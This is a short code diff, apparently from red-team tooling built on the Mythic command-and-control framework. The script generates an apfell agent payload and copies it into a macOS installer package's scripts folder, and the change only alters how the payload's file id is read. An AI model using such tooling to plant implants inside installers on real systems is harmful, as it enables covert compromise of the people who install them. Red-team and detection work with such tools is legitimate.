@@ -55,7 +55,7 @@ def install_pkg_with_LD():
         resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
         print("[*] Downloading apfell payload")
         
-        payloadDownloadid = resp.response.file_id.agent_file_id 
+        payloadDownloadid = resp.response.file["agent_file_id"]
 
         payload_contents = await mythic.download_payload(resp.response)
         pkg_payload = payload + "/simple-package/scripts/files/SimpleStarter.js"
